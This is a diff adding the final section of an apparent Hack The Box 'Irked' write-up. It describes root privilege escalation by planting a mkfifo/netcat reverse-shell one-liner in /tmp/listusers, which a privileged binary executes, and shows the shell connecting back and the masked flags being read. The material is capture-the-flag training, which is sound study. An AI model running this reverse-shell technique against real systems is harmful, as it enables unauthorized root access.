@@ -177,3 +177,38 @@ It is still being actively developed
 djmardov pts/2        2019-04-04 09:01 (10.10.14.14)
 sh: 1: /tmp/listusers: not found
 ```
+The `viewuser` binary is searching for a file `/tmp/listusers`. Let's see if we can write to this file. I will try to upload a shell command in the file and start a listener on my local machine.
+
+```bash
+ircd@irked:/home$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.102 6666 >/tmp/f" > /tmp/listusers                                                              
+<;cat /tmp/f|/bin/sh -i 2>&1|nc <my-ip> 6666 >/tmp/f" > /tmp/listusers
+```
+
+Now let's try to execute the binary again and see if we pop a shell.
+
+```bash
+ircd@irked:/home$ viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2019-05-11 07:04 (:0)
+```
+
+What do you know! We popped a shell on the listener we started and it's a root shell!
+
+```bash
+kali@noone:~/Irked$ nc -lnvp 6666
+listening on [any] 6666 ...
+connect to [10.10.16.102] from (UNKNOWN) [10.10.10.117] 54261
+# id     
+uid=0(root) gid=1001(ircd) groups=1001(ircd)
+# cat /root/root.txt
+8******************************3
+# locate user.txt
+/home/djmardov/Documents/user.txt
+/usr/share/doc/fontconfig/fontconfig-user.txt.gz
+# cat /home/djmardov/Documents/user.txt
+4******************************e
+```
+
+This is definetely the first time I am showing the root.txt file before the user.txt file. I guess that's what happens when you try to do your recon thoroughly before trying to score points on HTB.
+Great box nonetheless!
